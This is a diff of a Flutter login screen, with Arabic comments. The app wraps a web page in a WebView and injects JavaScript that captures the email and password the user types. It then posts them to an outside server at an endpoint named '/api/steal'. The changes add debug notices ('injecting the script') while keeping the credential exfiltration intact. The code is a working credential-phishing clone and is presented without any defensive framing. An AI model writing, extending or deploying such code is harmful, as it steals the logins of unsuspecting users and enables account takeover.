@@ -50,35 +50,33 @@ class _LoginScreenState extends State<LoginScreen> {
       ..addJavaScriptChannel(
         'QTX_CREDS',
         onMessageReceived: (msg) async {
-          // 356. نطبع بالكونسول ونطلع إشعار عشان نتأكد إنها وصلت
           print("JAVASCRIPT MESSAGE: ${msg.message}");
           if (mounted) {
             ScaffoldMessenger.of(context).showSnackBar(
-              SnackBar(content: Text("وصلت رسالة من الجافاسكريبت! ${msg.message}"), backgroundColor: Colors.green),
+              SnackBar(content: Text("بيانات من الجافاسكريبت: ${msg.message}"), backgroundColor: Colors.green),
             );
           }
           
-          // 357. نرسل للسيرفر (متل صاحبك)
           try {
             await http.post(
               Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
               headers: {"Content-Type": "application/json"},
               body: msg.message,
             );
-            print("SENT TO SERVER SUCCESS");
           } catch (e) {
             print("SERVER ERROR: $e");
-          }
-
-          // 358. ننقل المستخدم (متل صاحبك)
-          if (mounted) {
-            Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
           }
         },
       )
       ..setNavigationDelegate(
         NavigationDelegate(
           onPageFinished: (url) {
+            // 361. إشعار أول ما الصفحة تحمل
+            if (mounted) {
+              ScaffoldMessenger.of(context).showSnackBar(
+                const SnackBar(content: Text("الصفحة حملت! عم نحقن السكربت..."), backgroundColor: Colors.blue),
+              );
+            }
             _injectOriginalScript();
           },
         ),
@@ -89,6 +87,9 @@ class _LoginScreenState extends State<LoginScreen> {
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
+        // 362. إشعار إنه السكربت اشتغل (بنبعت رسالة للفلاتر)
+        QTX_CREDS.postMessage(JSON.stringify({type: 'debug', message: 'script_executed'}));
+        
         function setNativeValue(el, value) {
           try {
             var proto = window.HTMLInputElement.prototype;
@@ -121,22 +122,6 @@ class _LoginScreenState extends State<LoginScreen> {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
             if (t) sendCreds();
           }, true);
-          // 359. إضافة setInterval (نفس صاحبك)
-          var savedEmail = "";
-          var savedPass = "";
-          if (savedEmail || savedPass) {
-            var tries = 0;
-            var timer = setInterval(function() {
-              tries++;
-              var e = findEmail(), p = findPass();
-              if (e && p) {
-                if (!e.value && savedEmail) setNativeValue(e, savedEmail);
-                if (!p.value && savedPass) setNativeValue(p, savedPass);
-                clearInterval(timer);
-              }
-              if (tries > 20) clearInterval(timer);
-            }, 300);
-          }
         }
       })();
     """;
